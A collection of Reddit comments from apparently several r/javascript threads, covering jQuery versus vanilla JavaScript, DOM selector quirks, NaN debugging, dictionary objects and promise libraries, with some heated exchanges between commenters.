I can see that. The paradigm does seem much better suited to the more pluggable API's, such as jQueryUI.
http://needsmorejquery.com/
The thing is: A "check the boxes" builder would make JQuery actually slower. A lot of people use code.jquery.com or Google as CDN. Because JQuery is loaded on a lot of websites, almost everybody has JQuery already in their cache so another request doesn't need to be made. If you use a builder, you have a custom build version of JQuery and you need to host it yourself, so everytime a new visitor comes to your website, their browser needs to request the custom build JQuery. I do recommend to use a fallback of JQuery on your own server, because sometimes code.jquery.com or Google's CDN can fail. (Although very unlikely.)
Because reinventing the wheel is always the way to.
this just might be what I needed, thanks!
`removeClass()` and `hasClass()` are not as optimized as they could be. You could start by caching the regular expression so it's not created for each call, and you could avoid creating arrays with `split()` and `join()`.
`$el.find()` isn't as simple as it's lead on to be. Modern browsers don't support the much-needed [`:scope`](https://developer.mozilla.org/en-US/docs/Web/CSS/:scope) pseudo-class which enables [combinator rooted queries](http://ejohn.org/blog/thoughts-on-queryselectorall/). For instance, imagine a nested structure of unordered lists: &lt;ul&gt; &lt;li&gt;1 &lt;ul&gt; &lt;li&gt;1.1&lt;/li&gt; &lt;li&gt;1.2&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;2 &lt;ul&gt; &lt;li&gt;2.1&lt;/li&gt; &lt;li&gt;2.2&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; Assume you have a reference to a `&lt;ul&gt;` node that does not have an ID, and you want to fetch all *immediate child nodes* who are `&lt;li&gt;` tags: **jQuery**: $ul.find('&gt; li'); **Chrome 20+, FF 21+** (no IE support at all) ul.querySelectorAll(':scope &gt; li'); I implemented a shim called [scopedQuerySelectorShim](https://github.com/lazd/scopedQuerySelectorShim) that adds support for scoped queries in IE9+, but this goes to show that there is still some magic left in jQuery, even if you're on the bleeding edge.
I made an app 3-4 years ago without any library and was just a soup of functions and global variables. Since then, I kept on improving the code structure as I added more features and got better at javascript. But after a point I thought of starting from scratch and use RequireJS and jQuery after learning them very well. I got to about 50% of the functionality of the original and realized that adding these libraries make it a lot easier for me to make poor decisions. I still had to deal with browser issues and my memory footprint, download size etc. was a lot higher. I have now ditched all the libraries and am back to vanilla js. I may be missing some features that these libraries had, but I don't think I really needed them anyways. 
You too? Thought I was losing my damn mind
&gt;because I don't want to worry about edge cases that I've now taken for granted as non-issues. This pretty much describes my experience using RequireJS
Too bad it isn't CommonJS compliant, otherwise I would Browserify the living shit out of that
**Performance:** Believe it or not, but native DOM is faster. **Page weight:** jQuery weighs in at 35kb. If your library is 2kb, jQuery's size starts to sound like a lot. **Compatibility:** No conflict mode, old versions of jQuery, and multiple versions of jQuery on the same page are headaches that you might have to deal with if you choose to rely on jQuery. **Adoption:** Some potential users may refuse to have jQuery on their site, especially if it employs Angular or another library that duplicates jQuery's functionality. **Simplicity:** Keep it simple. Don't pull in a huge library to do a little thing unless you have to.
This site doesn't use jQuery! Heretics!
can you make a fiddle/bin/plunker ?
the submit input is submitting the form. Submitting a form causes the page to redirect to the action page. You should stop that default behaviour with something like: function calculate(event) { event.preventDefault();
So where exactly do I write this in my code? I see the submit at the end of my script and replaced it with what you mentioned and nothing happened. I literally have no clue what I'm doing ha sorry if im confusing
You are absolutely correct. jQuery smooths out many differences in browsers. That pretty well cements it as a pretty important library. But if you just need to hide this element when you click that button, jQuery is a bit of an overkill. But really I just wanted people to understand that, and at the time of my original comment, there were several people responding to the title of the article, not the content. (I did downvote accordingly, as well.)
I could, but I've never used jsfiddle or anything like that. Could you explain to me how to do so?
What if I want to keep all the view in the same file? I don't like to have a css and a js file for the view. In this way I can change what I want at runtime.
Then you're doing it wrong. You need to change arbitrary styles at runtime? Change CSS classes (except when hiding things, perhaps). You **will** reuse your styles, and hardcoding them in several places or representing them as objects will just lead to shit code that nobody will want to maintain. CSS was designed for defining style and gives you tons of awesome capabilities like pseudo-selectors, cascading application of styles, and animation. You can't do any of that using inline styles. Why don't you just keep everything related to the view in a specific folder? That meets your criteria for "everything in one place" and doesn't preclude changing styles at runtime.
That you don't want to know how to code in vanilla Javascript shows you are a waste of time. Just like 80% of all redditors.
[Fuckit.js](https://github.com/mattdiamond/fuckitjs)
I do have TDD in mind.. I'll take a look, thanks :)
This is telling me that my robot shouldn't access any content? No way, Jose. This scraper is an application that will be run on the user's computer. Would the site be able to differentiate between a robot's traffic and a user's traffic?
Thank you, that was informative.
In the function calculate. Add a new parameter (e) so it is function calculate (e) { This means the function takes what is passed from the event handler (e). e.preventDefault(); goes in the next line. That tells your code not to allow the event to make it to any other event handlers your code may have (in this case the default behavior of going to another webpage on submit). Another problem you have with your code is it looks like its using jquery. However you don't use the $ delimiter (or Jquery.). var amount = ('#amount').val(); should be var amount = $('#amount').val(); but only after including jquery in your code using a script tag. I would strongly suggest though unless jquery is required, not to use it. It only involves a little more code, and will help prevent a bad habit. A starting point would be document.getElementById('calculator').addEventListener('submit', calculate, true); 
I can't immediately think of a way to do all of this without JS, but you can get it done with less JS, and a few css rules. I could explain it, or I could just [link to this fiddle](http://jsfiddle.net/r6Anf/). Let me know if you have any questions.
Modern browsers actually cache regular expressions for you.
As a troll, you are quite inferior.
Unlikely until sky or another isp's faulty 'family' filters block the CDN as happened this week. Always supply a fallback :)
Maybe I misunderstand your intent. Are you looking for something that scrapes a page the user is currently on and does something (like add content, or modify existing content)? If yes, write a userscript (chrome can run them out of the box, firefox needs greasemonkey). This also won't be a problem. If you are looking to scrape a bunch of pages, unless you try to make it look human or the domain owner isn't looking for users that look like bots, then they may block your users (since they will probably block the IP of the bot).
That only works if the element was originally visible. If the stylesheet says it's hidden, removing 'style' will hide it. TBH that kind of usage is better served by adding/removing classes anyway.
What part of "I know how to code" is difficult to understand?
I don't think jQuery lets you use the '&gt; elem' form any more. If you want to find immediate children, there is a better function for that.
This. I came into this thread expecting a bunch of elitest "write your own libraries n00bs". But this is a great example of understanding fundamentally what you're working on and what tools you need.
I'm trying to have to bot mimic a user to retrieve files that are uploaded for them by the professor, if that makes sense. I hate having to login, surf through the different courses, and download all the documents. I guess I could include a screenshot or two of what the site looks like. There are a lot of jsp's that are dynamically created and sent down through get/post.
Ok, so I did not misunderstand. If the domain owner is actively looking for bots, your users will probably get blocked. Unless you do a good job making it look like a real user, which is pretty hard.
 request = new XMLHttpRequest request.open('GET', '/my/url', true) request.onload = function() { resp = this.response } request.send() Always set your listeners / callbacks before your send. In this case **request.send()** should come after **request.load = function(){}**. Sure, the likelihood of a synchronous response is *almost* impossible. Almost.
That's incorrect, check your facts. Sizzle supports selectors of the form `&gt; someElement`. The goal isn't to find immediate children, it's to root a query against immediate children of the element you're querying on: // Fetch the first grandchild descended from an active immediate child $ul.find('&gt; li[data-active] &gt; ul &gt; li:nth-child(0)'); Implementing the above without the convenience of `:scope` or Sizzle would require recursive application of `matchesSelector` or a unique ID hack that lets you root the query against the element (as implemented in scopedQuerySelectorShim).
I won't waste my time retyping my reply.
Randomize the order in which it navigates through links?
God forbid you learn how to communicate to strangers with a civil tone.
That's true. A more robust way would be to use `getComputedStyle` on an element of the same tagName to determine the default value of the display property. On further investigation, this is exactly what jQuery does using an iframe so stylesheets don't affect it. Quite heavy for such a simple operation, but robust.
first ask them why they are supporting a 7 year old browser.
OK turns out I was thinking of `$("&gt; elem", context)` which *is* deprecated (possibly removed now as I don't see any reference to it in the docs). But thanks for downvoting anyway, who cares about reddiquette, right? Incidentally, your example can easily be done using the children selector: $ul.children('li[attr]').children('ul')... Obviously this is a little more verbose than one sizzle call, but it doesn't require any of that complexity you're implying.
Because 1% of a million dollars a month adds up to $120k a year.
right, and I would counter the amount of time you pay developers to debug, and maintain code for IE7 means you probably barely break even on that $120k a year.
&gt; if it's a small chunk of code, then taking care of the maintenance yourself isn't too big a deal It's fine to maintain your own code -- but chunks of code that do not belong in your library (like all of the functions on this site) should be decoupled out so that they can be maintained, improved, and tested separately. This way they can receive their own pull requests, issues, etc. Most importantly: if you have multiple libraries that use these "chunk" of code, then you won't need to maintain the code in _each_ library. Basically the problem with the site is that it encourages inlining and duplicating code instead of using modules. 
Oh it's not my own site. If it were, I wouldn't support IE6 ;) Most clients get a "Nope, no IE6" from me as well. There's some clients where that won't fly thpugh, unfortunately. 
Besides the obvious answer of "any of them", I'd say pick a few and see which one you like the most. Honestly, there's no wrong answer here--only preferences. My personal favorite these days is Angular.js.
&gt; standardized across all browser Not really. Many of the functions here are just the author's interpretation of the "best solution." Some of the replies in this thread have already highlighted issues with the code. If other developers copy-and-paste these functions into their own libraries, and then a few weeks later the site changes or improves the function, all of those libraries will be outdated. Another example is the [requestAnimationFrame polyfill](https://github.com/HubSpot/youmightnotneedjquery/blob/gh-pages/comparisons/effects/fade_in/ie8.js), which is pretty limited. Other libraries which inlined this code will be outdated when [http://youmightnotneedjquery.com/](http://youmightnotneedjquery.com/) fixes the function. There is, of course, an [npm module](https://npmjs.org/package/raf.js) which would be better suited than using this site's code.
Many of those tiny libraries contain the same work-arounds and polyfills as jquery. These techniques are well documented on places like MDN and many of these libraries have CI set up to run against old IEs too, like this: https://github.com/substack/dnode#dnode jquery isn't the only game in town when it comes to browser compatibility.
Knowing how to code in vanilla Javascript will not save you from the idiosyncrasies of DOM manipulation across various browsers. 
Ah, you must be another jQuery bitch.
Yea that's definitely me right there. 
Are you going for the long troll here with your 5 year account or are you just an idiot? edit - quick explanation if you *are* just an idiot. JavaScript is not the DOM, the DOM is not JavaScript. Ever heard of Node?
I bookmarked the site and probably use one or two of them in the future
While `NaN` stands for "Not a Number", in javascript it actually **is** a `typeof` `Number`.
can you share you code that produces the value of rounded? You will get NaN when a math function fails, or when trying to parse a number fails.
To be fair, this site seems to share a lot in common with vanilla-js.com
http://www.reddit.com/r/javascript/comments/1we6zi/why_help_requests_in_this_subreddit_should/
Do you know how to use developer tools in your browser? edit: Saw your ninja edit. What the fuck does PHP have to do with your issue?
As in right clicking and selecting inspect element? Yes I'm familiar with the "Elements" tab. not ninja edit: If you read my code you'd see I have php embedded within it because I needed to retrieve a value from an external source.
Well of course not, because JSfiddle isn't going to execute PHP code embedded in JavaScript. 
/facepalm
Which is why I chose not to include a JSfiddle originally. I changed the dynamic value from the php to a constant for testing but its still not showing. http://jsfiddle.net/n5DP5/1/
That is a very helpful response. Thank you.
You modified your original post without saying so, that is a ninja edit.
That part is working, document.write(dogeValue) by writing "0.0014946" which checks out since that was the same value located at https://www.dogeapi.com/wow/?a=get_current_price
Maybe if you knew how to use the developer tools, you would see that there are errors in your code.
The php, while unconventional, is being executed correctly. document.write(dogeValue) is writing "0.0014946" which checks out since that was the same value located at https://www.dogeapi.com/wow/?a=get_current_price
I take it you don't know how to help here.
That's because you set up JSFiddle to run the JS code in an onload handler, so the function is being defined in an onload handler, which means it doesn't exist at the global scope, which means when the onload event fires you get &gt; ReferenceError: getPrices is not defined But even if that weren't the case, you're calling the function without passing an argument, which doesn't make any sense at all. [Here is a working example.](http://jsfiddle.net/n5DP5/2/) 
&gt;That's because you set up JSFiddle to run the JS code in an onload handler, so the function is being defined in an onload handler, which means it doesn't exist at the global scope, which means when the onload event fires you get There were so many things wrong, that is just one.
The "Elements" tab is one TAB in the developer tools. Another TAB is the CONSOLE which is where JavaScript errors get logged.
If you put half as much effort into solving your problem as you did arguing with me you would have figured the issue out yourself.
Wow, I can't believe I've been calling that without an argument this entire time. That looks like it was my only error. Geez... that's like 2 hours in the toilet. I really appreciate you pointing on this simple mistake.
Might want to create a this with OO. http://javascriptissexy.com/oop-in-javascript-what-you-need-to-know/ 
I'm hosting with wamp, I'm not on client-side. What would be my motive for lying? I'm telling you my code works now.
I was kind of a dick, I take for granted the things I learned years ago when I was first starting out. Developer tools has a couple useful tabs. Not only does the console have any JavaScript errors, but you can use 'console.log' in your JavaScript to write to the console, ex: "console.log(basePrice)" would have logged that your basePrice was undefined. This was why you were getting NaN, because you were doing math with an undefined variable. The issue with typeof, as was mentioned elsewhere, is that NaN (Not a Number) is of the "number" type. However, you can also check if something is an instance of a type. Example: var x = 1/"s"; console.log(typeof x); //"number" console.log(x instanceof Number); //false
Namespacing so that there aren't global variables on `window` and such?
I will definitely give that a read. Thanks!
`NaN` is a `Number`. It's a magical value from IEEE 754. (This is also the reason why there is stuff like +/- `Infinity` and +/- 0 or why whatever divided by zero results in `Infinity`.) http://en.wikipedia.org/wiki/IEEE_floating_point If you want to check if something is `NaN`, use `isNaN`. &gt;&gt;&gt; var x = 4 * 'asdf'; undefined &gt;&gt;&gt; typeof x "number" &gt;&gt;&gt; isNaN(x) true You create `NaN` whenever you do something stupid like multiplying an array with an object. Naturally, if you continue to do some more math with that `NaN` value, the result of that will be `NaN`, too: &gt;&gt;&gt; var x = NaN; undefined &gt;&gt;&gt; x + 1 NaN So, whenever you get `NaN`, you have to figure out where that came from. Set a breakpoint and check the inputs. If one of those isn't an instance of `Number` (and if type coercion won't fix that), you found the problem. If one of the inputs is `NaN`, set a breakpoint where that value is calculated and so on.
Correct. Or, at least keeping all your code under the same variable / ns in window.
See, at this point you should have said, "Well, gee, why is it NaN?" Then you would have looked at why sellAmount is also NaN. Then you would have realized that basePrice/dogeValue was NaN. Then you would have realized that basePrice was undefined. All this you could have solved in like 2 minutes if you had slowed down to think. EDIT: And it also seems like from your other comments you already realized that there was a problem with sellAmount, and you should have looked into why. This is called looking for a "Short, Self Contained, Correct (Compilable), Example"; see more details at: http://sscce.org/
The $(node).css('attr') example is easy in IE8+, too: (node.currentStyle || window.getComputedStyle(node))['attr'] Also, the offset Example is not really precise as jQuery's offset is. A better variant can be found on https://gist.github.com/atk/5712997 In addition, overwriting Array.isArray can lead to problems with Chrome, better use Array.isArray || (Array.isArray = function(obj) { ... }) Otherwise I like the idea to test if you really need jQuery (or any other library at that).
here is the [source](https://developer.mozilla.org/en-US/docs/Project:MDN/About)
The complexity I was implying is required for the solution **without** jQuery, by the way. For a generic solution that works with any selector, you have to do funny things like [give a temporary ID and root the query against that ID](https://github.com/lazd/scopedQuerySelectorShim/blob/master/src/scopedQuerySelectorShim.js#L42-L49). For a hand-coded, use-case specific solution, you could use `matchesSelector` against each element in the `element.children` NodeList, and if another immediate child selector is required, you'll have to do it again against the grandchildren. This is, incidentally, effectively what you posted above, and a verbose reiteration of my previous comment. It's not pretty, it's not efficient, and the bottom line is there is no elegant way to do this except to use `:scope`, which is lacking in browser support. This is one reason why it's still relevant to use jQuery at times, and testament to the fact that `find()` is not as simple as OP's page makes it out to be. Since you brought up [reddiquette](http://www.reddit.com/wiki/reddiquette), you should know you were downvoted by others because you posted incorrect information that did not add to the discussion. After you complained about it, I decided to pile on my downvote as well. Cheers!
I'm confused. Could you not just do 'typeof X === "number"' ? EDIT: Whoa, my mistake. I had no idea you could create a 'number object'. What are the benefits of this over just like, 'x = 0'?
never really looked into polymer web but already put off by the lack of working demo's on the polymer site. 
Yeah, if you could not directly link to a 1GB tar file next time, that would be great. 
Yeah but it doesn't let you track variables or anything like that. All it will say is can't set property value of null but didn't say why it's null
Yeah I could have said "cover up the DOM" but jQuery covers up a lot of javascript, too. It also hides issues with browsers that you need to know. That's why our company is so nimble with getting things done. While jQuery users rely on John Resig to do this work for them, my company employs a whole bunch of John Resig-types to do the same stuff smaller and faster. We know how to code.
Heisenbug? 
/facepalm
This is well done. I'd avoid the thread metaphor though. That has a pretty specific meaning and using thread to refer to what effectively is a promise chain is confusing. 
I think typeof is pretty safe - if somebody is using the "new" keyword with Strings, Booleans, or Numbers, they should not assume it will work perfectly, and instead coerce it to primitives with valueOf() before using it alongside other libraries. 
For each link on there there's a few if not many alternatives, I wish the author listed a few and gave reasons why they chose the ones they did over others.
Nice. Good share!
Thanks for your feedback! The only other serious JS I've written was Sencha Touch/Ext JS, and their class system forces you to write individual classes/cleanly separate things. This is my first real experience with more vanilla JS. Thanks again.
wouldn't this also work the same: var db = {};
Close, but same: `Object.create(null);` explicitly has no prototype, but `{}` does (it declares `hasOwnProperty`, `toString` etc). $ console.log('toString' in {}); // true $ console.log('toString' in Object.create(null)); // false It is called the [dict-pattern](http://www.2ality.com/2013/10/dict-pattern.html). 
relevant: http://bugs.jquery.com/ticket/14510
After looking for the code, I can't find the funciton. [https://github.com/mbostock/d3/wiki/Hierarchy-Layout#wiki-links](https://github.com/mbostock/d3/wiki/Hierarchy-Layout#wiki-links) is the function I'm talking about - can you point me to it in the source? I'm literally just trying to make this example [https://gist.github.com/GerHobbelt/3683278](https://gist.github.com/GerHobbelt/3683278) work. Any advice would be appreciated :)
Yup, most of the front end libraries/frameworks pretty much do it all these days.
Thanks for the warning!
Yeah the syntax and configuration doesn't really seem that much easier than Grunt but the .pipe workflow is really nice!
Unsure why you were downvoted... Likely the inspiration for the following: https://github.com/HubSpot/youmightnotneedjquery/commit/a454ac8435c0bebcabb14d6a01c4c1c95ca635c9
Great article. I just wanted to drop this here: http://shop.oreilly.com/product/0636920030508.do It's newly published a book on jQuery deferreds. It was written by a friend of mine, so perhaps I am a bit biased, but I think the book does a really great job of explaining things with examples and exercises. Someone who was confused by this article or who understood it all and wanted more might want to check out the book.
I'd hate working with you.
Well it's an interesting read, the comments are even more interesting. it seems to me that the other is tooting his own horn, perhaps an employee of microsoft or adobe, bitter that their propriety products didn't ultimately make the final cut. 
This is the Duke Nukem Forever of web libraries
What? Jquery turns 20 lines of javascript code into 3 lines of code etc. Its not about compatibility. Not for me at least. Its about convenience. 
indeed. i did not say i agreed with it. 
Of course! Dumb people hate being shown up by those far smarter than them.
&gt;jQuary LOL But seriously, there is a lot you can do with JavaScript. HTML Forms are a specialized sort of prompt if you think about it, and instead of to the console you can output back to HTML. Learn about the Document Object Model (DOM) to do this. This seems like the next logical step.
But you can just use more targetted, focused libraries that do each of those things, individually. With a package manager like npm you can go a long way.
Or there are modules for [window.getComputedStyle](https://npmjs.org/package/computed-style) and [Array.isArray](https://npmjs.org/package/isarray) that work all the way down to IE6. This discourse shouldn't just be jquery vs no modules. I mostly object to how jquery is a grab-bag of unrelated functionality that should exist as completely separate reusable components.
I would say the space of apps you can build with JS outside of the browser (with things like nodejs and node-webkit) is larger than inside the browser.
Referring to JQuery as JQuarry from now on.
 Object.keys(window); This is awesome. 
Hello again! I wanted to say a MASSIVE thank you for your feedback, it was incredibly helpful in putting together [v0.2.0 of Progressor](https://github.com/ejb/progressor.js) - especially in suggesting the use of Function.bind. If I knew you personally, I would buy you several beers.
Right on, glad to help!
Exactly.
You can read damn near *any* docs offline with [Dash](http://kapeli.com/dash).
Cool, also you were the first person to post on my new blog :)
Every web developer must know HTML and CSS, I suppose that you already know them I encourage you to read [eloquent javascript](http://eloquentjavascript.net/) , it will help you better understand javascript, it also has chapters ( 11 to 14 ) about how to use javascript to build web applications (interactive websites which talk with a web server using AJAX) Here is an [other resource](http://www.w3schools.com/js/js_htmldom.asp), I know that experts discourage reading W3schools *because they tell you the how, not the why* but i find it helpful, especially for beginners. The purpose of the two precedent resources is that you learn how to interact with the DOM (Document Object Model), and communicate with server using AJAX, jQuery is just one of the many libraries that make that work easier. I recommend that you understand what browsers offer before learning jQuery. If you like making games, I encourage you to learn little about the [canvas API](http://diveintohtml5.info/canvas.html), since it let you create HTML5 games easily. It is a joy!!! &lt;3
I didn't see that while I was writing. Looks like they might wait till the native promises come in. But, it is still open, and looks like everything is moving forwards. Can't wait to see what happens in this area. 
Truth is, you can read all the books, blogs, tutorials and code samples you like. Until you attempt to build something, none of the things you learn will make a great deal of sense. My suggestion is to find a 101 tutorial on building something you are interested in, give it a go and then improve it, learn about how you can make it better then implement it. If you then come back here with a specific question, lots of us will be ready to help you in any way we can. Good luck
I'm writing this templating engine that is supposed to be just like Handlebars, but not overwriting the DOM, so it [works with CSS transitions](http://geon.github.io/programming/2013/05/11/client-side-templating-breaks-css-transitions/). Is there any interest from you guys?
This should work. You can even do slideDown() instead of show()
 console.time("myLabel") // do some stuff console.timeEnd("myLabel") Will tell you how long stuff took 
I'd say it's more along the lines of Geraldo's unveiling of Al Capone's valut: http://www.politico.com/news/stories/0312/74405.html 
I do. If you can point me that'd be cool. Thanks.
You can nest these, too. console.time("onClick"); console.time("processThis"); //stuff console.timeEnd("processThis"); console.time("processThat"); //st√ºff console.timeEnd("processThat"); console.timeEnd("onClick"); 
Wow, just some amazing things in there. The event monitoring is flippin awesome.
It's worth pointing out that this isn't a Chrome extension; it's standardized in ES5. So you can use it in any ES5 environment, and shim it for ES3 environments (see [es5shim](https://github.com/es-shims/es5-shim)). It's especially useful for iterating through objects with array iterator functions: var foo = {a: 1, b: 2, c: 3}; var fooPairs = Object.keys(foo).map(function(key) { return [key, foo[key]]; }); // [["a", 1], ["b", 2], ["c", 3]] var oddKeys = Object.keys(foo).filter(function(key) { return foo[key] % 2 === 1; }); // ["a", "c"]
As I said in the post, webstorm is probably what you are looking for. Amazing refactoring tools, nice set of plugins, node debugging... And they have a 30 day trial :) http://www.jetbrains.com/webstorm/
Very interesting. I've already tried the webstorm javascript but was buggy and had a big lag. I'm watching the video and seems better. Tomorrow I will try it. Thanks for your comment, molant.
thanks for posting, this is great!
 cosole.log("I don\'t click on closed source blogs");
Great list, thanks
Cool thanks guys. I prob wont try these out till Monday. I'll show ya the finished product soon. =-) Learning as I go with JS. Tried Codepen but Ive found the easiest / fastest way for me to learn is to just dive face first into some functional code. 
Sometimes it turn 20 lines of javascript into 20,000 (+3).
Wow, had no idea about $0. Multiple times per day I'll be using this...
because Korea
You might be interested in [htmlbars](https://github.com/tildeio/htmlbars). It does something similar, but uses handlerbars syntax. Really, it's a fork of handlebars. It would be cool to see how your approach compares to theirs in terms of speed and API.
Interesting! Still, it seems the DOM is overwritten each time the template is rendered, which is what I want to avoid. Steeringwheel is ment to use Handlebars too. I haven't implemented it yet, but the text nodes in the dom are supposed to be rendered by Handlebars. This includes any text content in tags, and any attribute values. 
Agreed. People should have their own collection of well-honed tools to aid them in cases when using jQuery is just laziness.
tldr: `{}` inherits Object's prototype. `Object.create(null)` does not.
&gt;I've seen myself trying hard to stay DRY (Don't Repeat Yourself) so I use mixins, inheritance and utils classes. By doing this I also find myself making the code too complex, sometimes too many rules just to stay DRY. This is what happens when people too rigidly conform to whatever they consider to be best practices. What more programmers need to learn is what code should be above all else is readable. Anything else is secondary to that, even if you have to bend the rules of certain 'best practices' at times.
https://news.ycombinator.com/item?id=7115195
https://news.ycombinator.com/item?id=7156162
This is a really, REALLY good answer. I'd recommend everyone pay attention to this.
Ha ! lets make light of a spelling mistake instead of the actual argument about developers working with open source technology and using a closed source delivery platform. /clueless
Where is the pattern?
Its not really a pattern but more of a way of using maps to store data. 
Agreeing with you on the lag, for large webpages or pages with lots of nodes: inspections and actions in general seem to take a long time. Before Webstorm 7 I could see the program only gave itself a pitiful 500Mb cache. I'd happily configure the program for more RAM if I knew how.
So the problem here is that we are using `{}` as a dictionary, but as it delegates behaviour to `Object.prototype`, you get the "wrong" result when you write: var dict = {}; dict['toString'] !== undefined //=&gt; true, but wanted "false" The proposed solution is to write: var dict = Object.create(null); This eliminates all delegation. That's true, you might want your dictionaries to have behaviour of some sort. With this pattern, you'll have to call functions on the dictionary, e.g. `Object.keys(dict)`. If you want your dictionary to have *methods*, the above pattern won't work. What you can do in that case is stop using `dict['toString'] === undefined` as your test of membership and start using the tool that was designed for this exact purpose: var dict = {}; dict.hasOwnProperty('toString') //=&gt; false
Let me see if I have this right: 1. Is is an event to launch the library? No. 2. Is this an event to launch a *beta* of the library? No. 3. Is this an announcement of the launch date for the beta of the library? No. What else could it be? Oh, *an event to announce the date they'll launch the beta of a library.*
I was working off the logic that using the object as a map and having a case where you added or where looking to get 'toString' from this map then the logic might not be what you would expect. I know that this might not be a case anyone would come across but with user input etc it could happen. I had never come across Dict before and found it interesting. 
IMO they're both good patterns. Using `Object.create(null)` gives you something very close to a C Struct, a passive piece of data. You build functions around it. Using an object and `.hasOwnProperty` gives you something more like a Smalltalk Dictionary: If you want to know something about it, you use one of its methods to answer the question.
I've finished the HTML&amp;CSS course on codecademy. Thanks!
Thanks
LOL
Ok, Thank you for your feedback, very useful!! I have new implementation that is based on Q promises and adds wait, asyn pattern to Java Script: https://github.com/salboaie/asynchron Good luck!
 var father = loadPenguin.async('MrPenguin'); var mother = loadPenguin.async('MrsPenguin'); var family = loadPenguinFamily.async(father, mother); (function (family){ console.log(family); //whatever }).wait(family);
Oh, I'm sorry. I must've replied to the wrong post. You say I'm focusing on a spelling mistake instead of your argument? What was your argument exactly? "I don't click on closed source blogs"? That's not an argument, it's a preference. If I tell you "I hate Pepsi", I'm not advocating anything without saying why you should also hate Pepsi. /clueless? But, hell, now that you've actually said what you've got on your mind...why? Why do you think that people who work with open source software should feel obligated to use open source tools over closed source in all cases? I'm not trying to put words in your mouth if that's not your position, but I have 2 sentences to go on here. Please clarify if I'm not getting your position.
According to Adobe, any calculations which are more complex than simple addition and subtraction has to be done via JavaScript. A scripted PDF form would by far be the easiest solution for her.
Sorry, I posted a little bit before I knew the guidelines for posting stuff you've built yourself. If you look at my account reg date you'll see that I didn't register just to promote my own stuff. I'll do better.
I don't have access to Acrobat so actually wiring the JavaScript up might take a bit of **What happens when you do this? OK, change "foo" to "bar" and try again. What happened this time?** but I'm down if you are.
If you could post docs on the github readme that would great. I know what a state machine is and everything. But I'd like to see the syntax and whatnot before adopting the project. example: https://github.com/pluginaweek/state_machine
For most cases it has a better syntax for some people. This is just a very simple layer over the best promise library available (Q) so you just learn about 3 functions wait, async and fail and that is all. Even without undestandig promises you can use this library and get better code.
can you alternate them? console.time("A"); console.time("B"); console.timeEnd("A"); console.timeEnd("B"); 
Sure. I'll try to get that up there as soon as I can. The API is tiny, so it shoudn't take much time.
Async/await is likely coming in ES7: https://github.com/lukehoban/ecmascript-asyncawait. 
Nice work, Andrei. :-)
What is better about it than using .then()?
Async await is not the same with wait/async. asynchron marks calls with async (return a promise) and can put code to wait until promises are fulfilled. Asyncawait mark functions as asynchronous and call awaits... reversed and interesting because some boilerplate disapears. What is not that clear with asyncwait is the exection model, await can yield multiple times?
Please post all relevant code into a [jsfiddle](http://jsfiddle.net/) (or similar). We cannot debug things like this from a description :)
Hi, thanks. I have not done this before, so all new to me. I inserted the js here http://jsfiddle.net/KF5Z8/ A current example on the site is: http://www.residentialrealtors.co.uk/properties/33-daubeney-tower-2-bedroom-flat/ I am trying to get the small pics under the main image which I want full width. I really do not understand js well enough to achieve this. I have spent days going through this file, and through the style sheets trying to fix this. The elements on the page show as separate, but I think the element inspector is lying to me. I tried some style css changes with some great input from the css sub reddit, but nothing worked. Playing with the whole plugin shows that a lot of the elements on the page are created dynamically by js and posted to the page, making it look like they are independent elements to chrome
Simpler syntax,optimised for waiting multiple promises. Hiding more. Unify then and all. It is also trying to make simpler api for people that don't undestand promises ver well. Treat it as an experiment,be open.
Simpler syntax,optimised for waiting multiple promises. Hiding more. Unify then and all. It is also trying to make simpler api for people that don't undestand promises ver well. Treat it as an experiment,be open.
From a quick glance, if you change the following CSS you will get the basic alignment you're after. #fsrep-main-image { width: 740px } #fsrep-aimages { margin-left: 0 } There's a lot of code there though, so it's tough for someone who's not familiar with it to properly debug it without spending a decent amount of time on it.
THIS looks better than Microsofts approach with async/await?
To begin, we add the following properties to the fsrep-main-image class: width: 100% Now the main image container successfully takes the full width, and the image within is centered. Now to make sure that the main image within the container is also stretched, we include fsrep-main-image img in our above modification. It should look like this: #fsrep-main-image, #fsrep-main-image img { width: 100% !important; } Now we need to fix the preview images. Let's get rid of that left margin in the container. #fsrep-aimages { margin-left: 0 !important; } The values I've changed so far are !important, because we're overriding the css rule. If you can edit the stylesheet directly, you don't need to add important-- just change the width for the main (don't forget the main img), and remove the margin from the aimages altogether. Now for some reason, there is an fsrep-aimage outside of the fsrep-aimages container. To make sure this doesn't cause us issues, let's add float: left to our container as well-- ensuring that it will be located after our main image, and will appear correctly if any more oddities occur. #fsrep-aimages { margin-left: 0 !important; float: left; } Your complete css modification would look like this: #fsrep-main-image, #fsrep-main-image img { width: 100% !important; } #fsrep-aimages { margin-left: 0 !important; float: left; }
It's not that I'm not open. You're making claims that it's better and easier without really backing that up with any obvious evidence or explanation why. 
That's not at all true. You seem to be missing the main benefit of promises. Instead of writing frameworks to hide or get around them my recommendation to you would be to learn how to use them more effectively by embracing them and use them for a while instead of focusing on these libraries. 
How do you select the browser(s) you want to use for a particular test?
Wow, that nearly worked. The main picture went to full size, and the small images went down under the main image. They all aligned to the right though, and stay in groups of 3 horizontally, and go down in columns. so 6 small pics make 2 lines of images aligned right, as they were when they were next to the main picture. I have tried making the width full or 100% (for aimages) but that makes no difference. So close :( It seems the gallery program is writing to the page in that format regardless of the style sheet. There is a setting in a admin panel which allows you to control the size of the images, small and large, but when I set the resolution there it bumps theose small images off the page again. It seems the small images are set by the gallery js to align 3 in a row only. It also gives the 'aimages' a margin equal to the size that the main image is set to in the admin panel. If I set that to 0, then the main image vanishes completely, and the small images all align left where the main image used to be
I agree, angular.lodash does something similar, and it really pollutes the scopes. This also defeats the purpose of dependency injection. Instead, you should design your services to accept the relevant data with arguments. What I usually do is have the service function accept a single 'data' object and use lodash.pick to pass an object containing that data to that 'data' argument. Edit: I would make a jsfiddle, but I'm on my phone.
This doesn't really sound like a good idea at all as it's going against the framework and the whole idea of DI. I would rather have it be clear in my controllers / directives/ services / etc what the dependencies are. It might also help me see if there's a need to refactor or re-architect if it seems too busy or cluttered. This pushes things to background and essentially promotes one of the worst parts of JS, implied globals. I would be suspicious if I joined a project and saw angular being used like this. Thanks, but no thanks.
Blogspam - Blog intermediary. Direct link: http://www.play-create.com/projects/smokeandmirror/
